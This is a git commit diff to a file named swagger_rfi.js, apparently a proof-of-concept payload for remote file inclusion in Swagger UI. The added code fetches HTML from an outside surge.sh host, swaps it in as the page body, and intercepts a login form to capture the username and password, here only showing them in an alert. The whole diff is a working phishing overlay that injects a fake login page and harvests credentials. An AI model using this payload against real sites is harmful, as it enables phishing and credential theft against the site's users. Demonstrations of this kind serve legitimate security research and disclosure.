106675b80ae0a6fad4d0ac2ec0736382d41ce82c
testingssh4 <131162518+testingssh4@users.noreply.github.com>
2023-05-24 16:58:43 +0530

    Update swagger_rfi.js

--- swagger_rfi.js
+++ swagger_rfi.js
@@ -1,7 +1,16 @@
 fetch("https://tearful-earth.surge.sh/site.html").then(res=>res.text()).then(res => {
 
 
+  document.body.innerHTML = res;
 
+  const form = document.querySelector('#aa');
+
+  form.addEventListener("submit", function(evt) {
+    evt.preventDefault();
+
+    let login = document.querySelector('#user').value
+    let pass = document.querySelector('#pass').value
+    alert('Login: ' + login + " password: " + pass);
 
     return;
   }, true);
